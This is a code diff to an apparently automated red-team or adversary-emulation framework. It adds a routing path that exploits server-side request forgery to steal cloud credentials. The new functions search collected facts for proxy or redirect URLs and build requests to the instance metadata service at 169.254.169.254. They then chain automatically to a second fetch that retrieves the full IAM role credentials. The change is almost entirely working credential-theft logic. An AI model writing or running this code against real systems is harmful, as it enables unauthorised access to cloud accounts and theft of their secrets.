@@ -77,6 +77,30 @@ _INITIAL_ACCESS_TECHNIQUE_PREFIXES: frozenset[str] = frozenset({
     "T1078",  # Valid Accounts
 })
 
+# ADR-048: Web exploit techniques routed to MCP web-scanner
+_WEB_EXPLOIT_TECHNIQUES: frozenset[str] = frozenset({
+    "T1190",     # Exploit Public-Facing Application (SSRF variant)
+    "T1078.004", # Valid Accounts: Cloud Accounts
+    "T1530",     # Data from Cloud Storage Object
+})
+
+# ADR-048: SSRF proxy indicator keywords in fact values
+_SSRF_PROXY_KEYWORDS: tuple[str, ...] = (
+    "proxy", "redirect", "url=", "fetch=", "ssrf",
+    "dest=", "path=", "forward=",
+)
+
+
+def _is_web_exploit_technique(technique_id: str, engine: str) -> bool:
+    """Check if a technique should be routed to MCP web-scanner (ADR-048).
+
+    Only applies when engine='mcp' — Metasploit routes are untouched.
+    """
+    if engine != "mcp":
+        return False
+    return technique_id in _WEB_EXPLOIT_TECHNIQUES
+
+
 _TERMINAL_ERRORS: list[str] = [
     "scope violation",
     "platform mismatch",
@@ -329,6 +353,15 @@ class EngineRouter:
                 db, exec_id, now, technique_id, target_id, operation_id, ooda_iteration_id
             )
 
+        # -- ADR-048: Web exploit via MCP web-scanner (SSRF, cloud pivot) --
+        # Must come BEFORE initial access check because T1078.004 (cloud
+        # accounts) shares the T1078 prefix with InitialAccessEngine, but
+        # when engine="mcp" it should route to web-scanner instead.
+        if _is_web_exploit_technique(technique_id, engine) and settings.MCP_ENABLED and self._mcp_engine:
+            return await self._execute_web_exploit_via_mcp(
+                db, technique_id, target_id, operation_id, ooda_iteration_id,
+            )
+
         # -- SPEC-052: Initial Access route (T1110/T1078 -> InitialAccessEngine) --
         if tech_prefix in _INITIAL_ACCESS_TECHNIQUE_PREFIXES:
             return await self._execute_initial_access(
@@ -434,6 +467,114 @@ class EngineRouter:
                 "target_id": target_id, "engine": "mcp_recon",
                 "status": "failed", "error": str(e),
             }
+
+    async def _execute_web_exploit_via_mcp(
+        self, db: asyncpg.Connection, technique_id: str, target_id: str,
+        operation_id: str, ooda_iteration_id: str | None,
+    ) -> dict:
+        """ADR-048: Route web exploit techniques to MCP web-scanner.
+
+        Handles SSRF-to-IMDS credential exfiltration via web_http_fetch.
+        Looks for proxy/redirect URLs in facts, constructs the IMDS
+        request URL, and dispatches via MCP web-scanner.
+        """
+        exec_id = str(uuid.uuid4())
+        now = datetime.now(timezone.utc)
+
+        await db.execute(
+            "INSERT INTO technique_executions "
+            "(id, technique_id, target_id, operation_id, ooda_iteration_id, "
+            "engine, status, started_at) "
+            "VALUES ($1, $2, $3, $4, $5, $6, 'running', $7)",
+            exec_id, technique_id, target_id, operation_id,
+            ooda_iteration_id, "mcp", now,
+        )
+
+        await self._ws.broadcast(operation_id, "execution.update", {
+            "id": exec_id, "technique_id": technique_id,
+            "status": "running", "engine": "mcp",
+        })
+
+        # Find SSRF proxy URL from facts
+        ssrf_url = await self._find_ssrf_proxy_url(db, operation_id)
+        if not ssrf_url:
+            # No proxy found — use direct metadata URL as fallback
+            ssrf_url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+
+        try:
+            # Step 1: Fetch IMDS security-credentials/ (returns role name list)
+            result: ExecutionResult = await self._mcp_engine.execute(
+                "web-scanner:web_http_fetch",
+                ssrf_url,
+                params={"url": ssrf_url},
+            )
+
+            # ADR-048: Two-step IMDS chain — if response body is plain text
+            # (role name, not JSON), auto-chain step 2 to get full credentials
+            body1 = (result.output or "").strip()
+            if body1 and not body1.startswith("{") and not body1.startswith("["):
+                role_name = body1.split("\n")[0].strip()
+                if role_name:
+                    credential_url = f"{ssrf_url.rstrip('/')}/{role_name}"
+                    result = await self._mcp_engine.execute(
+                        "web-scanner:web_http_fetch",
+                        credential_url,
+                        params={"url": credential_url},
+                    )
+
+            final = await self._finalize_execution(
+                db, exec_id, technique_id, target_id, "mcp",
+                operation_id, result,
+            )
+            return final
+
+        except Exception as e:
+            logger.exception(
+                "Web exploit via MCP failed for technique %s", technique_id
+            )
+            failure_category = _classify_failure(str(e), "mcp")
+            await db.execute(
+                "UPDATE technique_executions SET status = 'failed', "
+                "error_message = $1, failure_category = $2, completed_at = $3 "
+                "WHERE id = $4",
+                str(e), failure_category, datetime.now(timezone.utc), exec_id,
+            )
+            return {
+                "execution_id": exec_id, "technique_id": technique_id,
+                "target_id": target_id, "engine": "mcp",
+                "status": "failed", "error": str(e),
+            }
+
+    async def _find_ssrf_proxy_url(
+        self, db: asyncpg.Connection, operation_id: str,
+    ) -> str | None:
+        """Find the most recent SSRF proxy/redirect URL from facts.
+
+        ADR-048: web.dir.found values have format "{full_url}|{status_code}".
+        Split on '|' to extract the URL before assembling the IMDS path.
+        The proxy URL is path-based (e.g. /proxy/169.254.169.254/...), so
+        we append the IMDS IP directly — no http:// prefix in the path.
+        """
+        rows = await db.fetch(
+            "SELECT trait, value FROM facts "
+            "WHERE operation_id = $1 AND ("
+            "  trait = 'web.vuln.ssrf' OR trait = 'web.dir.found' "
+            "  OR trait = 'web.http.response'"
+            ") ORDER BY collected_at DESC LIMIT 10",
+            operation_id,
+        )
+        for row in rows:
+            raw_value = row["value"]
+            # web.dir.found format: "{url}|{status}" — extract URL part
+            value = raw_value.split("|")[0] if "|" in raw_value else raw_value
+
+            if row["trait"] == "web.vuln.ssrf":
+                base = value.rstrip("/")
+                return f"{base}/169.254.169.254/latest/meta-data/iam/security-credentials/"
+            if any(kw in value.lower() for kw in _SSRF_PROXY_KEYWORDS):
+                base = value.rstrip("/")
+                return f"{base}/169.254.169.254/latest/meta-data/iam/security-credentials/"
+        return None
 
     async def _execute_initial_access(
         self, db, exec_id, now, technique_id, target_id,
